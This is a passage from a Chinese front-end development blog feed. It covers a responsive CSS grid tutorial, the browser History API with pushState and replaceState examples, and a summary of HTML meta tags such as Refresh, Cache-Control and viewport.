class="number">#FFDCDC</span>;</div><div class="line"> &#125;</div><div class="line"></div><div class="line"> <span class="selector-class">.col-1</span>&#123; <span class="attribute">width</span>: <span class="number">16.66%</span>; &#125;</div><div class="line"> <span class="selector-class">.col-2</span>&#123; <span class="attribute">width</span>: <span class="number">33.33%</span>; &#125;</div><div class="line"> <span class="selector-class">.col-3</span>&#123; <span class="attribute">width</span>: <span class="number">50%</span>;    &#125;</div><div class="line"> <span class="selector-class">.col-4</span>&#123; <span class="attribute">width</span>: <span class="number">66.66%</span>; &#125;</div><div class="line"> <span class="selector-class">.col-5</span>&#123; <span class="attribute">width</span>: <span class="number">83.33%</span>; &#125;</div><div class="line"> <span class="selector-class">.col-6</span>&#123; <span class="attribute">width</span>: <span class="number">100%</span>;   &#125;</div><div class="line"></div><div class="line"> <span class="selector-class">.outline</span>, <span class="selector-class">.outline</span> *&#123;</div><div class="line">     <span class="attribute">outline</span>: <span class="number">1px</span> solid <span class="number">#F6A1A1</span>; </div><div class="line"> &#125;</div><div class="line"></div><div class="line"> <span class="comment">/*-- 列内元素的样式 --*/</span></div><div class="line"> <span class="selector-attr">[class*='col-']</span> &gt; <span class="selector-tag">p</span> &#123;</div><div class="line">     <span class="attribute">background-color</span>: <span class="number">#FFC2C2</span>; </div><div class="line">     <span class="attribute">padding</span>: <span class="number">0</span>;</div><div class="line">     <span class="attribute">margin</span>: <span class="number">0</span>;</div><div class="line">     <span class="attribute">text-align</span>: center; </div><div class="line">     <span class="attribute">color</span>: white; </div><div class="line"> &#125;</div></pre></td></tr></table></figure>
<h3 id="HTML"><a href="#HTML" class="headerlink" title="HTML"></a>HTML</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"grid-container outline"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-1"</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span>col-1<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span> </div><div class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-1"</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span>col-1<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span> </div><div class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-1"</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span>col-1<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span> </div><div class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-1"</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span>col-1<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span> </div><div class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-1"</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span>col-1<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span> </div><div class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-1"</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span>col-1<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span> </div><div class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span> </div><div class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-2"</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span>col-2<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span> </div><div class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-2"</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span>col-2<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span> </div><div class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-2"</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span>col-2<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span> </div><div class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span> </div><div class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-3"</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span>col-3<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span> </div><div class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-3"</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span>col-3<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span> </div><div class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span> </div><div class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div></pre></td></tr></table></figure>
<h3 id="响应式的栅格系统"><a href="#响应式的栅格系统" class="headerlink" title="响应式的栅格系统"></a>响应式的栅格系统</h3><p>使我们的栅格系统适应手机屏幕是十分简单的，我们必须去适应列的宽度。</p>
<p>为了这简单的目的，在800px的屏幕下我将加倍列的宽度。</p>
<p>只有一件事情看上去是例外的，行中的最后一列可能会单独成行，像3个col-2，col-5与col-1。我们将最后的<code>.col-2</code>与<code>.col-1</code>行宽设为100%。</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">@<span class="keyword">media</span> all and (max-width:<span class="number">800px</span>)&#123;</div><div class="line">    <span class="selector-class">.col-1</span>&#123; <span class="attribute">width</span>: <span class="number">33.33%</span>; &#125;</div><div class="line">    <span class="selector-class">.col-2</span>&#123; <span class="attribute">width</span>: <span class="number">50%</span>;    &#125;</div><div class="line">    <span class="selector-class">.col-3</span>&#123; <span class="attribute">width</span>: <span class="number">83.33%</span>; &#125;</div><div class="line">    <span class="selector-class">.col-4</span>&#123; <span class="attribute">width</span>: <span class="number">100%</span>;   &#125;</div><div class="line">    <span class="selector-class">.col-5</span>&#123; <span class="attribute">width</span>: <span class="number">100%</span>;   &#125;</div><div class="line">    <span class="selector-class">.col-6</span>&#123; <span class="attribute">width</span>: <span class="number">100%</span>;   &#125;</div><div class="line"></div><div class="line">    <span class="selector-class">.row</span> <span class="selector-class">.col-2</span><span class="selector-pseudo">:last-of-type</span>&#123;</div><div class="line">        <span class="attribute">width</span>: <span class="number">100%</span>; </div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="selector-class">.row</span> <span class="selector-class">.col-5</span> ~ <span class="selector-class">.col-1</span>&#123;</div><div class="line">        <span class="attribute">width</span>: <span class="number">100%</span>; </div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>当屏幕比800px更小时，我们除了col-1以外，其余列width均设为100%。</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">@<span class="keyword">media</span> all and (max-width:<span class="number">650px</span>)&#123;</div><div class="line">    <span class="selector-class">.col-1</span>&#123; <span class="attribute">width</span>: <span class="number">50%</span>;   &#125;</div><div class="line">    <span class="selector-class">.col-2</span>&#123; <span class="attribute">width</span>: <span class="number">100%</span>;  &#125;</div><div class="line">    <span class="selector-class">.col-3</span>&#123; <span class="attribute">width</span>: <span class="number">100%</span>;  &#125;</div><div class="line">    <span class="selector-class">.col-4</span>&#123; <span class="attribute">width</span>: <span class="number">100%</span>;  &#125;</div><div class="line">    <span class="selector-class">.col-5</span>&#123; <span class="attribute">width</span>: <span class="number">100%</span>;  &#125;</div><div class="line">    <span class="selector-class">.col-6</span>&#123; <span class="attribute">width</span>: <span class="number">100%</span>;  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>现在我们可以在不使用框架的情况下，建立自己的响应式栅格系统了。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"grid-container outline"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-1"</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span>col-1<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span> </div><div class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-1"</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span>col-1<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span> </div><div class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-1"</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span>col-1<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span> </div><div class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-1"</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span>col-1<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span> </div><div class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-1"</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span>col-1<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span> </div><div class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-1"</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span>col-1<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span> </div><div class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span> </div><div class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-2"</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span>col-2<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span> </div><div class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-2"</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span>col-2<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span> </div><div class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-2"</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span>col-2<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span> </div><div class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span> </div><div class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-3"</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span>col-3<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span> </div><div class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-3"</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span>col-3<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span> </div><div class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span> </div><div class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-4"</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span>col-4<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span> </div><div class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-2"</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span>col-2<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span> </div><div class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span> </div><div class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-5"</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span>col-5<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span> </div><div class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-1"</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span>col-1<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span> </div><div class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span> </div><div class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-6"</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span>col-6<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span> </div><div class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span> </div><div class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div></pre></td></tr></table></figure>
<p>不过本文仅仅是构建栅格系统的初步要点。虽然这不是框架或是复杂的解决方案，但我希望它为建立CSS栅格系统提供了一个简明的过程。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;原文地址: &lt;a href=&quot;http://j4n.co/blog/Creating-your-own-css-grid-system&quot;&gt;http://j4n.co/blog/Creating-your-own-css-grid-system&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;CSS栅格已经出现很长时间了，它们经常会被包含在一些框架中，就像Bootstrap。我并不厌恶Bootstarp，但当你需要栅格布局而且使用框架是得不偿失的。那么怎样才能构建我们自己的CSS栅格布局呢？&lt;/p&gt;
    
    </summary>
    
      <category term="CSS" scheme="http://blackganglion.com/categories/CSS/"/>
    
    
      <category term="栅格系统" scheme="http://blackganglion.com/tags/%E6%A0%85%E6%A0%BC%E7%B3%BB%E7%BB%9F/"/>
    
  </entry>
  
  <entry>
    <title>history那些事</title>
    <link href="http://blackganglion.com/2016/03/15/history%E9%82%A3%E4%BA%9B%E4%BA%8B/"/>
    <id>http://blackganglion.com/2016/03/15/history那些事/</id>
    <published>2016-03-15T08:08:00.000Z</published>
    <updated>2016-07-08T14:05:46.000Z</updated>
    
    <content type="html"><![CDATA[<p>history对象保存着用户上网的历史记录，它是window对象的属性。但出于安全方面的考虑，开发人员无法得知用户浏览过的URL。</p>
<h2 id="window-history-length"><a href="#window-history-length" class="headerlink" title="window.history.length"></a>window.history.length</h2><p>返回浏览器历史列表中的URL数量，历史记录栈中共有多少页。</p>
<h2 id="window-history-state"><a href="#window-history-state" class="headerlink" title="window.history.state"></a>window.history.state</h2><p>此属性用于储存<code>window.history.pushState</code>与<code>window.history.replaceState</code>的data参数。</p>
<a id="more"></a>
<h2 id="window-history-go-n"><a href="#window-history-go-n" class="headerlink" title="window.history.go(n)"></a>window.history.go(n)</h2><p>在用户的历史记录里任意跳转，可以向前也可以向后。负数表示向后跳转，正数表示向前跳转。也可以传递字符串，浏览器会跳转到历史记录中包含该字符串的第一个位置。如果输入是0的话，会刷新页面。</p>
<h2 id="window-history-back"><a href="#window-history-back" class="headerlink" title="window.history.back()"></a>window.history.back()</h2><p>向后退一页。</p>
<h2 id="window-history-forward"><a href="#window-history-forward" class="headerlink" title="window.history.forward()"></a>window.history.forward()</h2><p>向前进一页。</p>
<h2 id="window-history-pushState-data-title-url"><a href="#window-history-pushState-data-title-url" class="headerlink" title="window.history.pushState(data, title [, url])"></a>window.history.pushState(data, title [, url])</h2><p>向history堆栈顶部添加一条新的记录，会改变URL但不会刷新页面。</p>
<p><code>data</code> - 对象，注意必须序列化，与URL相对应，onpopstate触发时会作为参数传入，比如要触发对应的ajax，可以把相应的参数放入data中。</p>
<p><code>title</code> - 标题，暂时这个参数是被忽略的，将来可能会有用。</p>
<p><code>url</code> - 浏览器不会在调用<code>pushState()</code>方法后加载该地址，但之后可能会试图加载，如用户重启浏览器。新的URL不一定是绝对路径: 如果是相对路径，它将以当前URL为基准；传入的URL与当前URL应该是<strong>同源</strong>的，否则，pushState()会抛出异常。该参数是可选的；不指定的话则为文档当前URL。</p>
<h2 id="window-onpopstate"><a href="#window-onpopstate" class="headerlink" title="window.onpopstate"></a>window.onpopstate</h2><p>当浏览器前进（go或浏览器的前进键）或是后退（back或浏览器的后退键）时，均会触发这个事件，传入url相对应的data参数（在<code>event.state</code>中）</p>
<p><img src="https://cloud.githubusercontent.com/assets/9314735/13771424/bd9b3eb4-eac8-11e5-8bcc-21107d2d032a.png" alt="15-1"></p>
<h2 id="window-history-replaceState-data-title-url"><a href="#window-history-replaceState-data-title-url" class="headerlink" title="window.history.replaceState(data, title [, url])"></a>window.history.replaceState(data, title [, url])</h2><p>replaceState()操作类似于pushState()，不同之处在于replaceState()方法会修改当前历史记录条目而并非创建新的条目。</p>
<p>看一个官方示例，就懂了:</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">window</span>.onpopstate = <span class="function"><span class="keyword">function</span>(<span class="params">event</span>) </span>&#123;</div><div class="line">  <span class="built_in">console</span>.log(<span class="string">"location: "</span> + <span class="built_in">document</span>.location + <span class="string">", state: "</span> + <span class="built_in">JSON</span>.stringify(event.state));</div><div class="line">&#125;;</div><div class="line"></div><div class="line"><span class="comment">// 添加并激活一个历史记录条目 http://example.com/example.html?page=1, 条目索引为1</span></div><div class="line">history.pushState(&#123;page: <span class="number">1</span>&#125;, <span class="string">"title 1"</span>, <span class="string">"?page=1"</span>);</div><div class="line"></div><div class="line"><span class="comment">// 添加并激活一个历史记录条目 http://example.com/example.html?page=2, 条目索引为2</span></div><div class="line">history.pushState(&#123;page: <span class="number">2</span>&#125;, <span class="string">"title 2"</span>, <span class="string">"?page=2"</span>);</div><div class="line"></div><div class="line"><span class="comment">// 修改当前激活的历史记录条目 http://ex..?page=2 变为 http://ex..?page=3, 条目索引为3</span></div><div class="line">history.replaceState(&#123;page: <span class="number">3</span>&#125;, <span class="string">"title 3"</span>, <span class="string">"?page=3"</span>); </div><div class="line"></div><div class="line"><span class="comment">// "location: http://example.com/example.html?page=1, state: &#123;"page":1&#125;"</span></div><div class="line">history.back();</div><div class="line"></div><div class="line"><span class="comment">// "location: http://example.com/example.html, state: null"</span></div><div class="line">history.back(); </div><div class="line"></div><div class="line"><span class="comment">// "location: http://example.com/example.html?page=3, state: &#123;"page":3&#125;"</span></div><div class="line">history.go(<span class="number">2</span>);</div></pre></td></tr></table></figure>
<p>现在我们的单页应用都是离线化的，或者说只通过少量ajax向后台请求数据完成页面渲染，这样就会产生一个问题，URL不会变化，如果用户需要返回上一页将无法返回。</p>
<p>为了可访问性，ajax内容改变后通常修改URL的hash值(赋值<code>location.hash</code>，触发<code>onhashchange</code>(IE8+)）事件，不支持只能轮询。SEO很不友好，Twitter和Google约定了使用#!xxx（即hash第一个字符为!），对搜索引擎进行支持。</p>
<p>这里顺便再提一下url的hash值，也就是所谓的锚点，在相应标签的href中添加”#+位置名称”，当浏览器读取带”#+位置名称”的URL后，可自动滚动到相应标签的可视区域，实现快速定位，浏览器在发生HTTP请求不会附带锚点内容，其只对浏览器起作用。锚点的本质就是修改容器的滚动高度。</p>
<p>再扯回来，对于这样的场景就应该采用ajax + history.pushState，每当页面发生ajax时，将当前页面信息与相应url推入浏览器的历史记录栈，一旦发生回退，触发onpopstate事件，取出event.state，再进行ajax查询，当然直接输入相应的url，也要能渲染出相应的页面。</p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://developer.mozilla.org/en-US/docs/Web/API/History_API" target="_blank" rel="external">Manipulating the browser history</a></p>
<p><a href="http://www.zhangxinxu.com/wordpress/2013/06/html5-history-api-pushstate-replacestate-ajax/" target="_blank" rel="external">ajax与HTML5 history pushState/replaceState实例</a></p>
<p><a href="http://www.welefen.com/use-ajax-and-pushstate.html" target="_blank" rel="external">使用ajax和history.pushState无刷新改变页面URL</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;history对象保存着用户上网的历史记录，它是window对象的属性。但出于安全方面的考虑，开发人员无法得知用户浏览过的URL。&lt;/p&gt;
&lt;h2 id=&quot;window-history-length&quot;&gt;&lt;a href=&quot;#window-history-length&quot; class=&quot;headerlink&quot; title=&quot;window.history.length&quot;&gt;&lt;/a&gt;window.history.length&lt;/h2&gt;&lt;p&gt;返回浏览器历史列表中的URL数量，历史记录栈中共有多少页。&lt;/p&gt;
&lt;h2 id=&quot;window-history-state&quot;&gt;&lt;a href=&quot;#window-history-state&quot; class=&quot;headerlink&quot; title=&quot;window.history.state&quot;&gt;&lt;/a&gt;window.history.state&lt;/h2&gt;&lt;p&gt;此属性用于储存&lt;code&gt;window.history.pushState&lt;/code&gt;与&lt;code&gt;window.history.replaceState&lt;/code&gt;的data参数。&lt;/p&gt;
    
    </summary>
    
      <category term="前端基本功" scheme="http://blackganglion.com/categories/%E5%89%8D%E7%AB%AF%E5%9F%BA%E6%9C%AC%E5%8A%9F/"/>
    
    
      <category term="history" scheme="http://blackganglion.com/tags/history/"/>
    
  </entry>
  
  <entry>
    <title>meta的一些总结</title>
    <link href="http://blackganglion.com/2016/03/12/meta%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/"/>
    <id>http://blackganglion.com/2016/03/12/meta的一些总结/</id>
    <published>2016-03-12T09:00:00.000Z</published>
    <updated>2016-07-08T14:04:31.000Z</updated>
    
    <content type="html"><![CDATA[<p>记得有一次做一个移动端网页时，无论是上线还是chrome F12移动端查看都无法正常响应式展现，只有在PC浏览器上缩放才行。后来才发现需要在head的meta里加一个viewport。这也让我第一次注意到了不起眼的meta，原来它暗藏许多的玄机，这里我们来总结一下！</p>
<p>meta标签提供关于HTML文档的元数据。元数据不会显示在页面上，但对于机器是可读的。它可用于浏览器(如何显示内容或重新加载页面)，搜索引擎(关键词)，或其他web服务。</p>
<h2 id="name-把content属性关联到一个名称"><a href="#name-把content属性关联到一个名称" class="headerlink" title="name - 把content属性关联到一个名称"></a>name - 把content属性关联到一个名称</h2><p>主要用于一些SEO优化</p>
<ul>
<li>author 网站作者</li>
<li>description 网站描述</li>
<li>keywords 网站关键词</li>
<li>…</li>
</ul>
<p>例如: </p>
<p><code>&lt;meta name=&quot;description&quot; content=&quot;the blog of Blackganglion&quot;&gt;</code></p>
<p><code>&lt;meta name=&quot;author&quot; content=&quot;BlackGanglion&quot;&gt;</code></p>
<a id="more"></a>
<h2 id="http-equiv-把content属性关联到HTTP头部"><a href="#http-equiv-把content属性关联到HTTP头部" class="headerlink" title="http-equiv - 把content属性关联到HTTP头部"></a>http-equiv - 把content属性关联到HTTP头部</h2><p>http-equiv类似HTTP头部协议，回应给浏览器有用的信息，列举一些常见的:</p>
<p><strong>Content-Type和Content-Language 显示字符集的设定</strong></p>
<p><code>&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; Charset=gb2312&quot;&gt;</code></p>
<p><code>&lt;meta http-equiv=&quot;Content-Language&quot; content=&quot;zh-CN&quot;&gt;</code></p>
<p><strong>Refresh 让网页多长时间(s)刷新自己，或在多长时间后让网页自动链接到其它网页</strong></p>
<p><code>&lt;meta http-equiv=&quot;Refresh&quot; content=&quot;30&quot;&gt;</code></p>
<p><code>&lt;meta http-equiv=&quot;Refresh&quot; content=&quot;5; Url=http://www.xia8.net&quot;&gt;</code></p>
<p>其中的5是指停留5秒钟后自动刷新到URL网址。</p>
<p><strong>Cache-Control 网页缓存控制</strong></p>
<p><code>&lt;meta http-equiv=&quot;Cache-Control&quot; content=&quot;max-age=7200&quot; /&gt;</code></p>
<p><code>max-age</code>(单位为s)指定设置缓存最大的有效时间，定义的是时间长短。当浏览器向服务器发送请求后，在max-age这段时间里浏览器就不会再向服务器发送请求了。</p>
<p><code>s-maxage</code>(单位为s)同max-age，只用于共享缓存（比如CDN缓存)。如果存在s-maxage，则会覆盖掉max-age和Expires header。</p>
<p><code>public</code>多用户间共享一份缓存。如果没有指定public还是private，则默认为public。</p>
<p><code>private</code>响应只作为私有的缓存，不能在用户间共享。如果要求HTTP认证，响应会自动设置为private。</p>
<p><code>no-cache</code>指定不缓存响应，表明资源不进行缓存。Cache-Control: private, max-age=0, no-cache。</p>
<p><code>no-store</code>绝对禁止缓存，每次请求资源都从服务器上获取。</p>
<p><strong>Expires 指定网页在缓存中的过期时间，是服务器端的具体时间点。一旦网页过期，必须到服务器上重新调阅。</strong></p>
<p>Expires是Web服务器响应消息头字段，在响应http请求时告诉浏览器可以直接从浏览器缓存读取数据，而无需再次请求，Cache-Control的优先级更高。</p>
<meta http-equiv="Expires" content="0">

<meta http-equiv="Expires" content="Wed, 26 Feb 1997 08:21:57 GMT">

<p>必须使用GMT的时间格式，或直接设为0(数字表示多少时间后过期)。 </p>
<p><strong>Cache-Control与Expires的区别在于Cache-Control下浏览器不会向服务器发送请求，Expires仍要向服务器发送请求</strong></p>
<p><strong>X-UA-Compatible 指定网页的兼容性模式设置</strong></p>
<p><code>&lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;</code></p>
<p>以上代码告诉IE浏览器，IE8/9及以后的版本都会以最高版本IE来渲染页面。</p>
<p><code>&lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=Edge,chrome=1&quot;&gt;</code></p>
<p>以上代码IE=edge告诉IE使用最新的引擎渲染网页，chrome=1则可以激活Chrome Frame.</p>
<p><strong>viewport 能优化移动浏览器的显示</strong></p>
<p><code>&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no&quot;&gt;</code></p>
<ul>
<li>width：宽度（数值 或 device-width)（范围从200到10,000，默认为980像素）</li>
<li>height：高度（数值 或 device-height）（范围从223到10,000）</li>
<li>initial-scale：初始的缩放比例（范围从&gt;0到10）</li>
<li>minimum-scale：允许用户缩放到的最小比例</li>
<li>maximum-scale：允许用户缩放到的最大比例</li>
<li>user-scalable：用户是否可以手动缩放 (no 或 yes)</li>
</ul>
<hr>
